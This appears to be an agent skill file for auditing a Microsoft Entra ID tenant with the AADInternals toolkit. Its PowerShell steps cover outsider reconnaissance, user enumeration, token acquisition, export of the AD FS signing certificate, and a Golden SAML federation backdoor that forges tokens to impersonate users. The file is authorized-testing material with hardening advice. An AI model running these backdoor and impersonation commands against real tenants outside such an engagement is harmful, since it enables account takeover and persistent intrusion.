---
name: auditing-entra-id-with-aadinternals
description: Drive the AADInternals PowerShell toolkit to perform Microsoft Entra ID tenant reconnaissance, access-token acquisition across Microsoft APIs, and federation/AD FS backdoor testing (Golden SAML, T1606.002) for defensive validation.
subdomain: identity-access-management
facing: config
mitre_attack:
- T1606.002
nist_csf:
- ID.AM-03
upstream: auditing-entra-id-with-aadinternals@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.

## Prerequisites

- Written authorization covering identity-attack and federation-backdoor testing
- Windows host with PowerShell 5.1+ (or PowerShell 7 on supported subset)
- For backdoor/federation tests: Global Administrator (or equivalent) in target tenant, in scope per ROE
- Install module from PowerShell Gallery:
  ```powershell
  Install-Module AADInternals -Scope CurrentUser
  Import-Module AADInternals
  # Cross-platform AsOutsider-only reimplementation (no creds) is also available:
  #   https://github.com/synacktiv/AADOutsider-py
  ```
- Familiarity with SAML/WS-Federation, OAuth tokens, and Azure AD Connect

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1606.002 | Forge Web Credentials: SAML Tokens | `ConvertTo-AADIntBackdoor` + `New-AADIntSAMLToken` forge SAML tokens for arbitrary users via controlled federation `IssuerUri` (Golden SAML) |

Related techniques: **T1087.004** Account Discovery: Cloud Account (recon), **T1528** Steal Application Access Token (token acquisition), **T1556.007** Modify Authentication Process: Hybrid Identity (federation/PTA backdoors).

## Workflow

### Step 1: Unauthenticated outsider reconnaissance
No credentials required. Identify verified domains, tenant ID, federation type, brand, and SSO status.

```powershell
# Full outsider recon for a domain (table output)
Invoke-AADIntReconAsOutsider -DomainName "target.com" | Format-Table
# Login/realm details: federation vs managed, AuthURL, brand
Get-AADIntLoginInformation -Domain "target.com"
# Tenant GUID
Get-AADIntTenantID -Domain "target.com"
```

### Step 2: External user enumeration (optional, noisy)
Validate whether usernames exist via GetCredentialType / autologon endpoints.

```powershell
# Supply a list of candidate UPNs to test existence
Invoke-AADIntUserEnumerationAsOutsider -UserName "user1@target.com"
# Or pipe many:
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider
```

### Step 3: Acquire and cache access tokens
With valid credentials (or interactive prompt), obtain tokens for API you need. `-SaveToCache` lets later cmdlets reuse token automatically.

```powershell
# Azure AD Graph (legacy graph.windows.net) token, cached
Get-AADIntAccessTokenForAADGraph -SaveToCache
# Microsoft Graph (graph.microsoft.com)
$mg = Get-AADIntAccessTokenForMSGraph
# Exchange Online
$exo = Get-AADIntAccessTokenForEXO
```

### Step 4: Authenticated directory enumeration
Using cached/acquired token, read directory objects to map privilege.

```powershell
# Global tenant info (uses cached AAD Graph token)
Get-AADIntTenantDetails
# Enumerate users and look for privileged / synced accounts
Get-AADIntUsers | Select-Object UserPrincipalName, DirSyncEnabled, ImmutableId
```

### Step 5: Inspect federation / AD FS configuration
Determine whether tenant uses federated domains and where token-signing keys live — prerequisite for Golden SAML.

```powershell
# If you have access to the AD FS server, export the token-signing certificate
Export-AADIntADFSSigningCertificate -Path .\adfs_signing.pfx
# Read AD FS configuration / encryption keys (on the AD FS box or via DKM)
Get-AADIntADFSConfiguration -Server adfs.target.com
```

### Step 6: Federation backdoor / Golden SAML (authorized only)
Convert domain to backdoor by setting known `IssuerUri`, then forge SAML token for target user using that domain's `ImmutableId`. **Only in controlled tenant with explicit authorization.**

```powershell
# Requires a Global Admin token (AAD Graph) cached in Step 3
ConvertTo-AADIntBackdoor -DomainName "backdoor.target.com"
# Output includes the IssuerUri to reuse when forging tokens.
# Forge a SAML token impersonating a user (ImmutableId from Get-AADIntUsers)
$saml = New-AADIntSAMLToken -ImmutableID "UQ989+t6fEq9/0ogYtt1pA==" `
    -Issuer "http://backdoor.target.com/adfs/services/trust/" -UseBuiltInCertificate
# Use the forged token to open a portal session as the impersonated user
Open-AADIntOffice365Portal -SAMLToken $saml
```

### Step 7: Document exposure and harden
Capture exactly what recon revealed, which tokens/APIs were reachable, and whether backdoor/Golden SAML path succeeded. Recommend: protect AD FS token-signing certs (HSM, restricted DKM access), alert on new/changed federation trusts, monitor `Set-DomainAuthentication`/`Set-MsolDomainFederationSettings`, and migrate where feasible to managed (cloud) authentication.

## Tools and Resources

| Resource | Purpose | Source |
|----------|---------|--------|
| AADInternals | Entra ID / AD FS attack & admin toolkit | https://github.com/Gerenios/AADInternals |
| AADInternals docs | Cmdlet reference and technique writeups | https://aadinternals.com/aadinternals/ |
| AADOutsider-py | Cross-platform AsOutsider reimplementation | https://github.com/synacktiv/AADOutsider-py |
| Golden SAML background | Federation backdoor technique writeup | https://aadinternals.com/post/aadbackdoor/ |
| MITRE T1606.002 | Forge Web Credentials: SAML Tokens | https://attack.mitre.org/techniques/T1606/002/ |

## Cmdlet Quick Reference

| Cmdlet | Position | Purpose |
|--------|----------|---------|
| `Invoke-AADIntReconAsOutsider` | None | Verified domains, tenant ID, federation type, SSO |
| `Get-AADIntLoginInformation` | None | Realm/login details for domain |
| `Get-AADIntTenantID` | None | Tenant GUID |
| `Invoke-AADIntUserEnumerationAsOutsider` | None | Validate user existence |
| `Get-AADIntAccessTokenForAADGraph` | Creds | Azure AD Graph token (`-SaveToCache`) |
| `Get-AADIntAccessTokenForMSGraph` | Creds | Microsoft Graph token |
| `Get-AADIntAccessTokenForEXO` | Creds | Exchange Online token |
| `Get-AADIntUsers` | Token | Enumerate directory users |
| `ConvertTo-AADIntBackdoor` | Global Admin | Convert domain into federation backdoor |
| `New-AADIntSAMLToken` | Backdoor | Forge SAML token for user (Golden SAML) |
| `Open-AADIntOffice365Portal` | SAML token | Open portal session as impersonated user |

## Validation Criteria

- [ ] Outsider recon completed; verified domains, tenant ID, and federation type recorded
- [ ] User enumeration tested (or documented as out of scope)
- [ ] Access token acquired and cached for at least one Microsoft API
- [ ] Authenticated directory enumeration performed (users/roles, synced accounts noted)
- [ ] Federation / AD FS configuration assessed for token-signing key exposure
- [ ] Backdoor / Golden SAML path tested in authorized controlled tenant or documented as out of scope
- [ ] Exposure documented with concrete impact
- [ ] Hardening recommendations delivered (cert protection, federation monitoring, managed auth migration)

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/auditing-entra-id-with-aadinternals
